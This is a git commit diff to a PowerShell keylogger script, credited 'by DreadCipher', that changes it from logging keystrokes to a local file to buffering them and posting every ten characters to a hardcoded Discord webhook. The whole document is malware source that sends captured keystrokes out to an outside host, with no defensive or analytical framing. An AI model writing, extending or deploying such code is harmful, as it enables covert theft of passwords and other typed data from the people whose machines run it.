54aadd03b259c9bd5c36a8af3c78433c20493a06
Kaiondatwzck <103587362+Kaiondatwzck@users.noreply.github.com>
2025-03-30 22:21:53 -0400

    Update keylogger.ps1

--- keylogger.ps1
+++ keylogger.ps1
@@ -1,8 +1,16 @@
-# Simple Keylogger by DreadCipher
+# Keylogger with Discord by DreadCipher
+$webhook = "https://discord.com/api/webhooks/1356088174123941999/wNZonGi3auoF4cXA5ehPaIL_Rd8qVSFZIeUJPOHbg0WUSOlOBHXmzNK0lbx_ijZfyVcx"
+$buffer = ""
+
 while ($true) {
     Start-Sleep -Milliseconds 100
     if ([Console]::KeyAvailable) {
         $key = [Console]::ReadKey($true)
-        $key.Char | Out-File -FilePath "C:\Temp\log.txt" -Append
+        $buffer += $key.Char
+        if ($buffer.Length -ge 10) {
+            $payload = @{ content = "Typed: $buffer" } | ConvertTo-Json
+            Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType "application/json"
+            $buffer = ""
+        }
     }
 }
